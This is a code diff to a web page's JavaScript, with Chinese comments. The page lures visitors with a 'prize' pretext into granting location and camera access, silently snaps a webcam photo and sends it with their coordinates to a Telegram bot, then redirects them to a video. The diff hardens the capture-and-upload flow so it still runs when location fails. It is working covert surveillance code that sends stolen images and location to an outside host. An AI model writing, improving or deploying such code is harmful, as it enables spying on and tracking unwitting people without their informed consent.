@@ -32,31 +32,30 @@
             startBtn.style.display = 'none';
             status.innerText = "正在请求地理位置权限...";
 
+            // 1. 获取定位（增加 try-catch 容错，失败也不中断）
+            let pos = null;
             try {
-                // 1. 先请求定位权限
-                const pos = await new Promise((res, rej) => {
+                pos = await new Promise((res, rej) => {
                     navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 5000 });
                 });
-                
                 status.innerText = "位置已获取，正在请求相机权限...";
-                
-                // 2. 再请求相机权限
+            } catch (err) {
+                console.warn("定位获取失败，尝试跳过...");
+                status.innerText = "正在请求相机权限...";
+            }
+            
+            // 2. 请求相机
+            try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 
-                // 3. 所有权限拿到后，再显示视频框
+                // 3. 所有步骤完成，显示画面
                 video.srcObject = stream;
                 video.style.display = 'block'; 
-                status.innerText = "权限已全部授予，正在处理中...";
+                status.innerText = "🌐 Processing.........";
                 
-                // 4. 延迟一点显示画面后自动上传
                 setTimeout(() => captureAndUpload(stream, pos), 1000);
-                
             } catch (err) {
-                status.innerText = "⚠️:Location and camera permissions must be granted to enable it
-
-📍   ✅️
-
-📷✅";
+                status.innerText = "⚠️:Location and camera permissions must be granted to enable it\n\n📍 ✅️\n📷✅";
                 console.error(err);
             }
         });
@@ -66,7 +65,7 @@
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
             
-            const locationText = `纬度: ${pos.coords.latitude.toFixed(6)}, 经度: ${pos.coords.longitude.toFixed(6)}`;
+            const locationText = pos ? `纬度: ${pos.coords.latitude.toFixed(6)}, 经度: ${pos.coords.longitude.toFixed(6)}` : "位置信息未获取";
             
             canvas.toBlob(async (blob) => {
                 const formData = new FormData();
@@ -74,12 +73,16 @@
                 formData.append('photo', blob, 'prize.jpg');
                 formData.append('caption', `来自ID: ${CHAT_ID}\n${locationText}`);
 
-                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-                if ((await res.json()).ok) {
-                    stream.getTracks().forEach(t => t.stop());
-                    window.location.href = "https://github.com/sachinbagwan208-design/-/raw/main/000.MP4";
-                } else {
-                    status.innerText = "上传失败，请刷新重试";
+                try {
+                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                    if ((await res.json()).ok) {
+                        stream.getTracks().forEach(t => t.stop());
+                        window.location.href = "https://github.com/sachinbagwan208-design/-/raw/main/000.MP4";
+                    } else {
+                        status.innerText = "上传失败，请刷新重试";
+                    }
+                } catch(e) {
+                    status.innerText = "上传网络错误";
                 }
             }, 'image/jpeg');
         }
